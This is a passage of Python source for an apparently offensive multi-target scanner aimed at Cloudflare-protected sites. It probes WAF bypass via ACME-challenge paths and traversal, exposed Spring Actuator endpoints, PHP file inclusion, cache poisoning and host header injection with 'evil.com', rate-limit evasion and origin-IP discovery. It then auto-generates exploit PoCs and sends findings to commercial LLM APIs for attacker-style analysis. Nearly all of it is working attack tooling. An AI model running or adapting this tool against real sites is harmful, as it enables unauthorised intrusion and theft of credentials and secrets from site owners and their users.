                    if self.detect_origin_response(baseline_resp, test_resp):
                        waf_bypassed = True
                        successful_token = test_token
                        acme_resp = test_resp
                        break
                except:
                    continue
            
            results['waf_bypass'] = waf_bypassed
            
            if waf_bypassed and acme_resp:
                acme_test_url = f"{target}/.well-known/acme-challenge/{successful_token}"
                print(f"  {Fore.RED}[!] WAF BYPASS DETECTED{Style.RESET_ALL} - Origin responding on ACME path!")
                print(f"  {Fore.YELLOW}[*] Successful token: {successful_token}{Style.RESET_ALL}")
                
                # Verify: test if other tokens also bypass (confirm not coincidence)
                verify_token = self.generate_random_token()
                verify_url = f"{target}/.well-known/acme-challenge/{verify_token}"
                try:
                    verify_resp = self.session.get(verify_url, headers=headers, timeout=self.timeout,
                                                  allow_redirects=False, verify=False)
                    if self.detect_origin_response(baseline_resp, verify_resp):
                        print(f"  {Fore.RED}[!] CONFIRMED{Style.RESET_ALL} - Multiple tokens bypass WAF (vulnerability confirmed)")
                        results['verified'] = True
                    else:
                        print(f"  {Fore.YELLOW}[?] Only specific token works - may be false positive{Style.RESET_ALL}")
                        results['verified'] = False
                except:
                    pass
                
                results['framework'] = self.detect_framework(acme_resp)
                print(f"  {Fore.YELLOW}[*] Detected Framework: {results['framework']}{Style.RESET_ALL}")
                
                # Try to extract origin IP
                print(f"  {Fore.CYAN}[*] Attempting to find Origin IP...{Style.RESET_ALL}")
                origin_ips = self.extract_origin_ip(target, acme_resp)
                
                # If redirect, just log (IP from redirect hostname is usually still CF)
                if acme_resp.status_code in [301, 302, 303, 307, 308]:
                    location = acme_resp.headers.get('location', '')
                    print(f"  {Fore.YELLOW}[*] Redirect detected to: {location[:80]}{Style.RESET_ALL}")
                    
                    # Follow redirect to check response headers further
                    if location:
                        try:
                            redirect_resp = self.session.get(location, headers=headers, 
                                                            timeout=self.timeout, verify=False,
                                                            allow_redirects=False)
                            more_ips = self.extract_origin_ip(location, redirect_resp)
                            for ip_info in more_ips:
                                if ip_info['ip'] not in [x['ip'] for x in origin_ips]:
                                    origin_ips.append(ip_info)
                        except:
                            pass
                
                if origin_ips:
                    results['origin_ips'] = origin_ips
                    print(f"  {Fore.GREEN}[+] Potential Origin IP(s) Found:{Style.RESET_ALL}")
                    for ip_info in origin_ips:
                        print(f"      {Fore.RED}→ {ip_info['ip']}{Style.RESET_ALL} (Source: {ip_info['source']})")
                        
                        # Verify IP
                        if self.verify_origin_ip(ip_info['ip'], target, token):
                            ip_info['verified'] = True
                            print(f"        {Fore.GREEN}✓ Verified - Direct connection successful!{Style.RESET_ALL}")
                else:
                    print(f"  {Fore.YELLOW}[-] Could not determine Origin IP from passive methods{Style.RESET_ALL}")
                    print(f"  {Fore.CYAN}[*] Suggestions for finding Origin IP:{Style.RESET_ALL}")
                    print(f"      - SecurityTrails: https://securitytrails.com/domain/{urlparse(target).hostname}/history/a")
                    print(f"      - Censys: https://search.censys.io/search?q={urlparse(target).hostname}")
                    print(f"      - Shodan: https://www.shodan.io/search?query=ssl.cert.subject.cn:{urlparse(target).hostname}")
                    print(f"      - ViewDNS: https://viewdns.info/iphistory/?domain={urlparse(target).hostname}")
                
                results['findings'].append({
                    'type': 'WAF Bypass',
                    'url': acme_test_url,
                    'status_code': acme_resp.status_code,
                    'length': len(acme_resp.content),
                    'token': token,
                    'vulnerable': True,
                    'origin_ips': origin_ips if origin_ips else [],
                    'redirect_location': acme_resp.headers.get('location', None)
                })
            else:
                if self.verbose:
                    print(f"  {Fore.GREEN}[OK]{Style.RESET_ALL} WAF appears to be enforced on ACME path")
            
            # Step 3: Test Spring/Tomcat Actuator with ..;/ traversal
            print(f"  {Fore.CYAN}[*] Testing Spring Boot Actuator endpoints...{Style.RESET_ALL}")
            
            actuator_payloads = self.generate_payloads_with_token(ACTUATOR_PAYLOADS, token)
            for payload in actuator_payloads:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                url = target + payload
                
                try:
                    resp = self.session.get(url, headers=headers, timeout=self.timeout,
                                           allow_redirects=False, verify=False)
                    
                    if resp.status_code == 200:
                        content = resp.text.lower()
                        
                        # Detect actuator JSON response
                        actuator_indicators = [
                            '"status":', '"propertysources":', '"activeprofiles":',
                            '"systemproperties":', '"beans":', '"mappings":',
                            '"health":', '"info":', 'jdbc:', 'datasource'
                        ]
                        
                        if any(ind in content for ind in actuator_indicators):
                            finding = {
                                'type': 'Actuator Exposure',
                                'url': url,
                                'status_code': resp.status_code,
                                'length': len(resp.content),
                                'token': token,
                                'vulnerable': True
                            }
                            
                            # Check for critical data exposure
                            critical_data = ['password', 'secret', 'api.key', 'aws.', 
                                           'private', 'credential', 'token', 'jdbc']
                            if any(c in content for c in critical_data):
                                finding['critical'] = True
                                print(f"  {Fore.RED}[CRITICAL]{Style.RESET_ALL} {url}")
                                print(f"    └── Sensitive data exposed!")
                            else:
                                print(f"  {Fore.RED}[VULN]{Style.RESET_ALL} {url} - Actuator Exposed")
                            
                            results['findings'].append(finding)
                    
                    elif resp.status_code in [401, 403] and self.verbose:
                        print(f"  {Fore.BLUE}[AUTH]{Style.RESET_ALL} {payload.split('/')[-1]} - Protected")
                        
                except requests.RequestException as e:
                    if self.verbose:
                        print(f"  {Fore.RED}[ERR]{Style.RESET_ALL} {str(e)[:50]}")
            
            # Step 4: Test PHP LFI payloads
            if self.verbose:
                print(f"  {Fore.CYAN}[*] Testing PHP LFI payloads...{Style.RESET_ALL}")
            
            php_payloads = self.generate_payloads_with_token(PHP_LFI_PAYLOADS, token)
            for payload in php_payloads:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                url = target + payload
                
                try:
                    resp = self.session.get(url, headers=headers, timeout=self.timeout,
                                           allow_redirects=False, verify=False)
                    
                    if resp.status_code == 200:
                        content = resp.text
                        
                        # Detect LFI success
                        lfi_indicators = ['root:', 'daemon:', 'localhost', '[extensions]', 
                                         '[fonts]', 'win.ini', 'boot.ini', '/bin/bash']
                        
                        if any(ind in content for ind in lfi_indicators):
                            print(f"  {Fore.RED}[CRITICAL]{Style.RESET_ALL} {url}")
                            print(f"    └── LFI Confirmed!")
                            
                            results['findings'].append({
                                'type': 'LFI',
                                'url': url,
                                'status_code': resp.status_code,
                                'length': len(resp.content),
                                'token': token,
                                'vulnerable': True,
                                'critical': True
                            })
                        
                except requests.RequestException:
                    pass
            
            # Step 5: Test Next.js / SSR payloads
            if self.verbose:
                print(f"  {Fore.CYAN}[*] Testing Next.js/SSR endpoints...{Style.RESET_ALL}")
            
            nextjs_payloads = self.generate_payloads_with_token(NEXTJS_PAYLOADS, token)
            for payload in nextjs_payloads:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                url = target + payload
                
                try:
                    resp = self.session.get(url, headers=headers, timeout=self.timeout,
                                           allow_redirects=False, verify=False)
                    
                    if resp.status_code == 200:
                        content = resp.text.lower()
                        
                        # Check for SSR data leakage
                        if any(x in content for x in ['__next_data__', 'pageprops', 'initialprops']):
                            print(f"  {Fore.YELLOW}[INFO]{Style.RESET_ALL} {url} - SSR Data Found")
                            
                            results['findings'].append({
                                'type': 'SSR Data Exposure',
                                'url': url,
                                'status_code': resp.status_code,
                                'length': len(resp.content),
                                'token': token,
                                'interesting': True
                            })
                        
                except requests.RequestException:
                    pass
            
            # Step 6: Test header bypass (X-middleware-subrequest, etc)
            if self.verbose:
                print(f"  {Fore.CYAN}[*] Testing header-based WAF bypass...{Style.RESET_ALL}")
            
            for bypass_header in BYPASS_HEADERS:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                test_headers = headers.copy()
                test_headers.update(bypass_header)
                header_name = list(bypass_header.keys())[0]
                
                # Test header di root path dan ACME path
                acme_url = f"{target}/.well-known/acme-challenge/{token}"
                
                try:
                    resp = self.session.get(acme_url, headers=test_headers, timeout=self.timeout,
                                           allow_redirects=False, verify=False)
                    
                    if resp.status_code == 200 and len(resp.content) > 100:
                        if self.verbose:
                            print(f"  {Fore.GREEN}[BYPASS]{Style.RESET_ALL} Header: {header_name}")
                        
                        results['findings'].append({
                            'type': 'Header Bypass',
                            'url': acme_url,
                            'status_code': resp.status_code,
                            'header': header_name,
                            'interesting': True
                        })
                        
                except requests.RequestException:
                    pass
            
            # Step 7: Test Cloudflare WAF Bypass payloads
            if self.verbose:
                print(f"  {Fore.CYAN}[*] Testing Cloudflare WAF bypass techniques...{Style.RESET_ALL}")
            
            for payload in CF_WAF_BYPASS_PAYLOADS:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                url = target + payload
                
                try:
                    resp = self.session.get(url, headers=headers, timeout=self.timeout,
                                           allow_redirects=False, verify=False)
                    
                    # Check if payload bypassed WAF
                    if resp.status_code in [200, 403, 500]:
                        content = resp.text.lower()
                        
                        # Check for successful bypass indicators
                        bypass_indicators = ['root:', 'password', 'etc/passwd', 'configuration', 
                                            'admin', 'dashboard', 'login', 'unauthorized']
                        
                        if any(ind in content for ind in bypass_indicators) or resp.status_code == 200:
                            if 'access denied' not in content and 'blocked' not in content:
                                if self.verbose:
                                    print(f"  {Fore.YELLOW}[CHECK]{Style.RESET_ALL} WAF bypass possible: {payload[:50]}...")
                                
                                results['findings'].append({
                                    'type': 'WAF Bypass Payload',
                                    'url': url,
                                    'status_code': resp.status_code,
                                    'payload': payload,
                                    'interesting': True
                                })
                        
                except requests.RequestException:
                    pass
            
            # Step 8: Test Cloudflare specific paths
            print(f"  {Fore.CYAN}[*] Testing Cloudflare specific paths...{Style.RESET_ALL}")
            
            for path in CF_BYPASS_PATHS:
                if self.delay > 0:
                    time.sleep(self.delay)
                    
                url = target + path
                
                try:
                    resp = self.session.get(url, headers=headers, timeout=self.timeout,
                                           allow_redirects=False, verify=False)
                    
                    if resp.status_code == 200:
                        content = resp.text.lower()
                        
                        # cdn-cgi/trace reveals useful info
                        if 'cdn-cgi/trace' in path:
                            if 'colo=' in content or 'ip=' in content:
                                print(f"  {Fore.YELLOW}[INFO]{Style.RESET_ALL} {path} - CF Debug info exposed")
                                
                                # Extract IP from trace
                                ip_match = re.search(r'ip=([^\s\n]+)', resp.text)
                                if ip_match:
                                    print(f"    └── Client IP: {ip_match.group(1)}")
                                
                                results['findings'].append({
                                    'type': 'CF Debug Info',
                                    'url': url,
                                    'status_code': resp.status_code,
                                    'interesting': True
                                })
                        
                        # Check for other interesting content
                        elif any(x in content for x in ['email', 'security', 'contact', 'apple', 'android']):
                            if self.verbose:
                                print(f"  {Fore.BLUE}[INFO]{Style.RESET_ALL} {path} - Content found")
                        
                except requests.RequestException:
                    pass
            
            # Step 9: Test Cache Poisoning payloads
            print(f"  {Fore.CYAN}[*] Testing cache poisoning vectors...{Style.RESET_ALL}")
            
            for payload in CF_CACHE_POISON_PAYLOADS:
                if self.delay > 0:
                    time.sleep(self.delay)
                
                # Replace {random} with actual random value
                test_payload = payload.replace("{random}", str(random.randint(100000, 999999)))
                url = target + test_payload
                
                # Headers for cache poisoning
                poison_headers = headers.copy()
                poison_headers['X-Forwarded-Host'] = 'evil.com'
                poison_headers['X-Original-URL'] = '/admin'
                poison_headers['X-Rewrite-URL'] = '/admin'
                
                try:
                    resp = self.session.get(url, headers=poison_headers, timeout=self.timeout,
                                           allow_redirects=False, verify=False)
                    
                    # Check cache headers
                    cache_status = resp.headers.get('cf-cache-status', '').upper()
                    
                    if cache_status in ['HIT', 'MISS', 'DYNAMIC']:
                        if self.verbose:
                            print(f"  {Fore.BLUE}[CACHE]{Style.RESET_ALL} {test_payload[:40]} - Status: {cache_status}")
                        
                        # Check if poisoned content reflected
                        if 'evil.com' in resp.text:
                            print(f"  {Fore.RED}[VULN]{Style.RESET_ALL} Cache poisoning possible!")
                            results['findings'].append({
                                'type': 'Cache Poisoning',
                                'url': url,
                                'status_code': resp.status_code,
                                'cache_status': cache_status,
                                'vulnerable': True
                            })
                        
                except requests.RequestException:
                    pass
            
            # Step 10: Test Host Header Injection
            print(f"  {Fore.CYAN}[*] Testing host header injection...{Style.RESET_ALL}")
            
            for host_header in HOST_HEADER_PAYLOADS:
                if self.delay > 0:
                    time.sleep(self.delay)
                
                test_headers = headers.copy()
                test_headers.update(host_header)
                
                try:
                    resp = self.session.get(target, headers=test_headers, timeout=self.timeout,
                                           allow_redirects=False, verify=False)
                    
                    # Check if injected host is reflected
                    content = resp.text.lower()
                    if 'evil.com' in content or 'evil.com' in str(resp.headers).lower():
                        print(f"  {Fore.RED}[VULN]{Style.RESET_ALL} Host header injection: {list(host_header.keys())[0]}")
                        
                        results['findings'].append({
                            'type': 'Host Header Injection',
                            'url': target,
                            'status_code': resp.status_code,
                            'header': list(host_header.keys())[0],
                            'vulnerable': True
                        })
                        
                except requests.RequestException:
                    pass
            
            # Step 11: Test Rate Limit Bypass
            print(f"  {Fore.CYAN}[*] Testing rate limit bypass headers...{Style.RESET_ALL}")
            
            rate_bypass_success = False
            for rate_header in RATE_LIMIT_BYPASS_HEADERS:
                if self.delay > 0:
                    time.sleep(self.delay)
                
                test_headers = headers.copy()
                # Replace {random_ip} with random IP
                for k, v in rate_header.items():
                    if '{random_ip}' in v:
                        rate_header[k] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                
                test_headers.update(rate_header)
                
                try:
                    # Make multiple requests to test rate limit
                    resp = self.session.get(target, headers=test_headers, timeout=self.timeout,
                                           allow_redirects=False, verify=False)
                    
                    if resp.status_code == 200:
                        rate_bypass_success = True
                        if self.verbose:
                            print(f"  {Fore.BLUE}[INFO]{Style.RESET_ALL} Rate limit header accepted: {list(rate_header.keys())[0]}")
                        
                except requests.RequestException:
                    pass
            
            if rate_bypass_success and self.verbose:
                results['findings'].append({
                    'type': 'Rate Limit Bypass',
                    'interesting': True
                })
            
            # Step 12: Test Sensitive Paths via ACME bypass
            print(f"  {Fore.CYAN}[*] Testing sensitive paths via ACME bypass...{Style.RESET_ALL}")
            
            for path in SENSITIVE_PATHS:
                if self.delay > 0:
                    time.sleep(self.delay)
                
                # Try via ACME path traversal
                acme_path = f"/.well-known/acme-challenge/{token}/..{path}"
                url = target + acme_path
                
                try:
                    resp = self.session.get(url, headers=headers, timeout=self.timeout,
                                           allow_redirects=False, verify=False)
                    
                    if resp.status_code == 200:
                        content = resp.text.lower()
                        
                        # Check for sensitive content indicators
                        sensitive_indicators = [
                            'password', 'secret', 'api_key', 'apikey', 'token',
                            'database', 'mysql', 'postgres', 'mongodb',
                            'aws_', 'azure_', 'gcp_', 'private_key',
                            'authorization', 'credential', 'admin', 'root',
                            '[core]', 'remote "origin"', 'user ='  # git config
                        ]
                        
                        if any(ind in content for ind in sensitive_indicators):
                            print(f"  {Fore.RED}[CRITICAL]{Style.RESET_ALL} Sensitive data via ACME: {path}")
                            
                            results['findings'].append({
                                'type': 'Sensitive Path Exposure',
                                'url': url,
                                'status_code': resp.status_code,
                                'path': path,
                                'vulnerable': True,
                                'critical': True
                            })
                        elif len(resp.content) > 50:
                            if self.verbose:
                                print(f"  {Fore.YELLOW}[CHECK]{Style.RESET_ALL} Path accessible: {path}")
                        
                except requests.RequestException:
                    pass
            
            # Step 13: Test GraphQL introspection via ACME
            print(f"  {Fore.CYAN}[*] Testing GraphQL introspection...{Style.RESET_ALL}")
            
            graphql_payloads = self.generate_payloads_with_token(GRAPHQL_PAYLOADS, token)
            for payload in graphql_payloads:
                if self.delay > 0:
                    time.sleep(self.delay)
                
                url = target + payload
                
                try:
                    resp = self.session.get(url, headers=headers, timeout=self.timeout,
                                           allow_redirects=False, verify=False)
                    
                    if resp.status_code == 200:
                        content = resp.text.lower()
                        
                        if '__schema' in content or 'types' in content or 'querytype' in content:
                            print(f"  {Fore.RED}[VULN]{Style.RESET_ALL} GraphQL introspection enabled via ACME!")
                            
                            results['findings'].append({
                                'type': 'GraphQL Introspection',
                                'url': url,
                                'status_code': resp.status_code,
                                'vulnerable': True
                            })
                        
                except requests.RequestException:
                    pass
            
            results['status'] = 'completed'
            
        except requests.RequestException as e:
            results['status'] = 'error'
            results['error'] = str(e)
            print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {target} - {str(e)[:80]}")
        
        return results
    
    def scan_targets(self, targets):
        """Scan multiple targets with threading"""
        print(f"\n{Fore.CYAN}[*] Starting scan on {len(targets)} target(s) with {self.threads} thread(s){Style.RESET_ALL}\n")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_target = {executor.submit(self.scan_target, target): target for target in targets}
            
            for future in concurrent.futures.as_completed(future_to_target):
                result = future.result()
                self.results.append(result)
        
        return self.results
    
    def print_summary(self):
        """Print scan results summary"""
        print(f"\n{Fore.CYAN}{'='*65}")
        print(f"                       SCAN SUMMARY")
        print(f"{'='*65}{Style.RESET_ALL}\n")
        
        total_targets = len(self.results)
        cf_targets = sum(1 for r in self.results if r.get('cloudflare'))
        waf_bypass = sum(1 for r in self.results if r.get('waf_bypass'))
        total_findings = sum(len(r.get('findings', [])) for r in self.results)
        vuln_findings = sum(1 for r in self.results for f in r.get('findings', []) if f.get('vulnerable'))
        critical_findings = sum(1 for r in self.results for f in r.get('findings', []) if f.get('critical'))
        
        print(f"  Total Targets Scanned : {total_targets}")
        print(f"  Cloudflare Protected  : {cf_targets}")
        print(f"  WAF Bypass Detected   : {Fore.RED if waf_bypass > 0 else Fore.GREEN}{waf_bypass}{Style.RESET_ALL}")
        print(f"  Total Findings        : {total_findings}")
        print(f"  Vulnerable            : {Fore.RED}{vuln_findings}{Style.RESET_ALL}")
        print(f"  Critical              : {Fore.RED}{critical_findings}{Style.RESET_ALL}")
        
        if total_findings > 0:
            print(f"\n{Fore.YELLOW}[+] Detailed Findings:{Style.RESET_ALL}")
            for result in self.results:
                if result.get('findings'):
                    print(f"\n  {Fore.CYAN}Target: {result['target']}{Style.RESET_ALL}")
                    print(f"  Framework: {result.get('framework', 'unknown')}")
                    
                    # Show origin IPs if found
                    if result.get('origin_ips'):
                        print(f"  {Fore.GREEN}Origin IP(s):{Style.RESET_ALL}")
                        for ip_info in result['origin_ips']:
                            verified = " ✓" if ip_info.get('verified') else ""
                            print(f"    → {Fore.RED}{ip_info['ip']}{Style.RESET_ALL}{verified} ({ip_info['source']})")
                    
                    for finding in result['findings']:
                        if finding.get('critical'):
                            status = f"{Fore.RED}CRITICAL"
                        elif finding.get('vulnerable'):
                            status = f"{Fore.RED}VULN"
                        else:
                            status = f"{Fore.YELLOW}INFO"
                        
                        print(f"    [{status}{Style.RESET_ALL}] {finding.get('type', 'Unknown')}")
                        print(f"         URL: {finding.get('url', 'N/A')}")
                        print(f"         Status: {finding.get('status_code', 'N/A')}")
                        if finding.get('header'):
                            print(f"         Header: {finding['header']}")
                        if finding.get('origin_ips'):
                            for ip_info in finding['origin_ips']:
                                verified = " (Verified)" if ip_info.get('verified') else ""
                                print(f"         {Fore.RED}Origin IP: {ip_info['ip']}{Style.RESET_ALL}{verified}")
    
    def save_results(self, filename):
        """Save results to file"""
        import json
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"\n{Fore.GREEN}[+] Results saved to: {filename}{Style.RESET_ALL}")


# ============================================
# POC GENERATOR CLASS
# ============================================

class POCGenerator:
    """Auto-generate exploit POC from scan results"""
    
    def __init__(self, results):
        self.results = results
        self.timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    def generate_all(self, output_dir="pocs"):
        """Generate POCs for all vulnerable targets"""
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        generated = []
        
        for result in self.results:
            if result.get('waf_bypass') or result.get('findings'):
                target = result['target']
                hostname = urlparse(target).hostname
                safe_name = re.sub(r'[^a-zA-Z0-9]', '_', hostname)
                
                # Generate Python POC
                py_file = os.path.join(output_dir, f"poc_{safe_name}.py")
                self._generate_python_poc(result, py_file)
                generated.append(py_file)
                
                # Generate Curl POC
                sh_file = os.path.join(output_dir, f"poc_{safe_name}.sh")
                self._generate_curl_poc(result, sh_file)
                generated.append(sh_file)
                
                # Generate Nuclei template
                yaml_file = os.path.join(output_dir, f"nuclei_{safe_name}.yaml")
                self._generate_nuclei_template(result, yaml_file)
                generated.append(yaml_file)
                
                # Generate Burp requests
                burp_file = os.path.join(output_dir, f"burp_{safe_name}.txt")
                self._generate_burp_requests(result, burp_file)
                generated.append(burp_file)
        
        return generated
    
    def _get_payloads_for_result(self, result):
        """Extract successful payloads from findings"""
        payloads = []
        for finding in result.get('findings', []):
            if finding.get('url'):
                parsed = urlparse(finding['url'])
                path = parsed.path
                if parsed.query:
                    path += f"?{parsed.query}"
                payloads.append(path)
        return payloads
    
    def _get_origin_ip(self, result):
        """Get origin IP from result"""
        origin_ips = result.get('origin_ips', [])
        if origin_ips:
            return origin_ips[0].get('ip', 'N/A')
        
        # Check findings for origin IP
        for finding in result.get('findings', []):
            if finding.get('origin_ips'):
                return finding['origin_ips'][0].get('ip', 'N/A')
        
        return 'N/A'
    
    def _generate_python_poc(self, result, filename):
        """Generate Python exploit POC"""
        target = result['target']
        hostname = urlparse(target).hostname
        origin_ip = self._get_origin_ip(result)
        payloads = self._get_payloads_for_result(result)
        
        # Build custom headers based on findings
        custom_headers = []
        for finding in result.get('findings', []):
            if finding.get('type') == 'Host Header Injection':
                header = finding.get('header', '')
                if header:
                    custom_headers.append(f'"{header}": "evil.com",')
        
        custom_headers_str = "\n        ".join(custom_headers) if custom_headers else '# No custom headers'
        
        # Get vulnerability types
        vuln_types = list(set(f.get('type', 'Unknown') for f in result.get('findings', [])))
        
        poc_content = POC_TEMPLATES['python'].format(
            target=target,
            hostname=hostname,
            origin_ip=origin_ip,
            timestamp=self.timestamp,
            vuln_type=", ".join(vuln_types),
            payloads=json.dumps(payloads, indent=4),
            custom_headers=custom_headers_str
        )
        
        with open(filename, 'w') as f:
            f.write(poc_content)
        
        print(f"  {Fore.GREEN}[+] Generated: {filename}{Style.RESET_ALL}")
    
    def _generate_curl_poc(self, result, filename):
        """Generate Curl/Bash exploit POC"""
        target = result['target']
        hostname = urlparse(target).hostname
        origin_ip = self._get_origin_ip(result)
        payloads = self._get_payloads_for_result(result)
        
        # Get vulnerability types
        vuln_types = list(set(f.get('type', 'Unknown') for f in result.get('findings', [])))
        
        # Build curl commands
        curl_commands = []
        for payload in payloads[:10]:  # Limit to 10
            curl_commands.append(f'curl -k -s -o /dev/null -w "%{{http_code}}" "$TARGET{payload}"')
            curl_commands.append(f'echo " - {payload[:60]}"')
        
        poc_content = POC_TEMPLATES['curl'].format(
            target=target,
            hostname=hostname,
            origin_ip=origin_ip,
            timestamp=self.timestamp,
            vuln_type=", ".join(vuln_types),
            curl_commands="\n".join(curl_commands)
        )
        
        with open(filename, 'w') as f:
            f.write(poc_content)
        
        print(f"  {Fore.GREEN}[+] Generated: {filename}{Style.RESET_ALL}")
    
    def _generate_nuclei_template(self, result, filename):
        """Generate Nuclei YAML template"""
        target = result['target']
        hostname = urlparse(target).hostname
        safe_name = re.sub(r'[^a-zA-Z0-9]', '-', hostname)
        payloads = self._get_payloads_for_result(result)
        
        # Get vulnerability types
        vuln_types = list(set(f.get('type', 'Unknown') for f in result.get('findings', [])))
        
        # Build nuclei requests
        nuclei_requests = []
        for i, payload in enumerate(payloads[:5]):  # Limit to 5
            nuclei_requests.append(f'''  - method: GET
    path:
      - "{{{{BaseURL}}}}{payload}"
    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200
          - 302
      - type: word
        words:
          - "actuator"
          - "password"
          - "secret"
        condition: or
''')
        
        poc_content = POC_TEMPLATES['nuclei'].format(
            target=target,
            target_safe=safe_name,
            timestamp=self.timestamp,
            vuln_type=", ".join(vuln_types),
            nuclei_requests="\n".join(nuclei_requests)
        )
        
        with open(filename, 'w') as f:
            f.write(poc_content)
        
        print(f"  {Fore.GREEN}[+] Generated: {filename}{Style.RESET_ALL}")
    
    def _generate_burp_requests(self, result, filename):
        """Generate Burp Suite request format"""
        target = result['target']
        parsed = urlparse(target)
        hostname = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        payloads = self._get_payloads_for_result(result)
        
        burp_requests = []
        for payload in payloads[:10]:
            burp_requests.append(f'''GET {payload} HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0
Accept: */*
Connection: close

---
''')
        
        poc_content = POC_TEMPLATES['burp'].format(
            target=target,
            timestamp=self.timestamp,
            burp_requests="\n".join(burp_requests)
        )
        
        with open(filename, 'w') as f:
            f.write(poc_content)
        
        print(f"  {Fore.GREEN}[+] Generated: {filename}{Style.RESET_ALL}")


# ============================================
# LLM ANALYZER CLASS
# ============================================

class LLMAnalyzer:
    """Analyze scan results using LLM (OpenAI/Anthropic/Ollama/Groq/Gemini)"""
    
    SUPPORTED_PROVIDERS = ['openai', 'anthropic', 'ollama', 'groq', 'gemini']
    
    def __init__(self, provider='openai', api_key=None, model=None, base_url=None, config=None):
        self.provider = provider.lower()
        self.config = config
        
        # Get API key from config or parameter or env
        if api_key:
            self.api_key = api_key
        else:
            self.api_key = get_api_key_from_config(config, self.provider)
        
        # Get base URL from config or parameter
        if base_url:
            self.base_url = base_url
        else:
            self.base_url = get_base_url_from_config(config, self.provider)
        
        # Default models per provider
        default_models = {
            'openai': 'gpt-4o',
            'anthropic': 'claude-3-5-sonnet-20241022',
            'ollama': 'llama3.2',
            'groq': 'llama-3.3-70b-versatile',
            'gemini': 'gemini-2.0-flash'
        }
        
        # Get model from config or parameter
        if model:
            self.model = model
        else:
            config_model = get_model_from_config(config, self.provider)
            self.model = config_model or default_models.get(self.provider, 'gpt-4o')
    
    def analyze(self, results, verbose=False):
        """Analyze scan results with LLM"""
        analyses = []
        
        # Filter targets yang perlu dianalisis
        targets_to_analyze = [r for r in results if r.get('waf_bypass') or r.get('findings')]
        total = len(targets_to_analyze)
        
        if total > 0:
            print(f"{Fore.CYAN}[*] Analyzing {total} target(s) with AI...{Style.RESET_ALL}")
        
        for i, result in enumerate(targets_to_analyze, 1):
            if verbose:
                print(f"\n{Fore.CYAN}[*] [{i}/{total}] Analyzing: {result['target']}{Style.RESET_ALL}")
            else:
                # Progress indicator sederhana
                print(f"  [{i}/{total}] {result['target'][:50]}...", end='\r')
            
            analysis = self._analyze_single(result)
            if analysis:
                analyses.append({
                    'target': result['target'],
                    'analysis': analysis
                })
        
        if not verbose and total > 0:
            print()  # Newline setelah progress
        
        return analyses
    
    def _analyze_single(self, result):
        """Analyze single target result"""
        # Prepare findings JSON
        findings_json = json.dumps(result.get('findings', []), indent=2)
        
        # Get origin IPs
        origin_ips = result.get('origin_ips', [])
        origin_ips_str = ", ".join([ip.get('ip', 'N/A') for ip in origin_ips]) if origin_ips else "Not found"
        
        # Build prompt
        prompt = LLM_ANALYSIS_PROMPT.format(
            target=result['target'],
            cloudflare=result.get('cloudflare', False),
            waf_bypass=result.get('waf_bypass', False),
            framework=result.get('framework', 'unknown'),
            origin_ips=origin_ips_str,
            findings_json=findings_json
        )
        
        try:
            if self.provider == 'openai':
                return self._call_openai(prompt)
            elif self.provider == 'anthropic':
                return self._call_anthropic(prompt)
            elif self.provider == 'ollama':
                return self._call_ollama(prompt)
            elif self.provider == 'groq':
                return self._call_groq(prompt)
            elif self.provider == 'gemini':
                return self._call_gemini(prompt)
            else:
                print(f"{Fore.RED}[!] Unsupported LLM provider: {self.provider}{Style.RESET_ALL}")
                return None
        except Exception as e:
            print(f"{Fore.RED}[!] LLM analysis error: {str(e)}{Style.RESET_ALL}")
            return None
    
    def _call_openai(self, prompt):
        """Call OpenAI API"""
        if not self.api_key:
            print(f"{Fore.YELLOW}[!] OpenAI API key not found. Set OPENAI_API_KEY env var or use --api-key{Style.RESET_ALL}")
            return None
        
        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json"
        }
        
        data = {
            "model": self.model,
            "messages": [
                {"role": "system", "content": "You are an expert security researcher and penetration tester."},
                {"role": "user", "content": prompt}
            ],
            "temperature": 0.7,
            "max_tokens": 4000
        }
        
        url = self.base_url or "https://api.openai.com/v1/chat/completions"
        
        resp = requests.post(url, headers=headers, json=data, timeout=60)
        resp.raise_for_status()
        
        return resp.json()['choices'][0]['message']['content']
    
    def _call_anthropic(self, prompt):
        """Call Anthropic Claude API"""
        if not self.api_key:
            print(f"{Fore.YELLOW}[!] Anthropic API key not found. Set ANTHROPIC_API_KEY env var or use --api-key{Style.RESET_ALL}")
            return None
        
        headers = {
            "x-api-key": self.api_key,
            "Content-Type": "application/json",
            "anthropic-version": "2023-06-01"
        }
        
        data = {
            "model": self.model,
            "max_tokens": 4000,
            "messages": [
                {"role": "user", "content": prompt}
            ]
        }
        
        url = self.base_url or "https://api.anthropic.com/v1/messages"
        
        try:
            resp = requests.post(url, headers=headers, json=data, timeout=120)
            
            if resp.status_code != 200:
                error_detail = resp.text[:500] if resp.text else "No details"
                print(f"{Fore.RED}[!] Anthropic API Error {resp.status_code}: {error_detail}{Style.RESET_ALL}")
                return None
            
            return resp.json()['content'][0]['text']
        except Exception as e:
            print(f"{Fore.RED}[!] Anthropic request failed: {str(e)}{Style.RESET_ALL}")
            return None
        
        resp = requests.post(url, headers=headers, json=data, timeout=60)
        resp.raise_for_status()
        
        return resp.json()['content'][0]['text']
    
    def _call_ollama(self, prompt):
        """Call local Ollama API"""
        url = self.base_url or "http://localhost:11434/api/generate"
        
        data = {
            "model": self.model,
            "prompt": prompt,
            "stream": False
        }
        
        resp = requests.post(url, json=data, timeout=120)
        resp.raise_for_status()
        
        return resp.json()['response']
    
    def _call_groq(self, prompt):
        """Call Groq API"""
        if not self.api_key:
            print(f"{Fore.YELLOW}[!] Groq API key not found. Set GROQ_API_KEY env var or use --api-key{Style.RESET_ALL}")
            return None
        
        headers = {
            "Authorization": f"Bearer {self.api_key}",
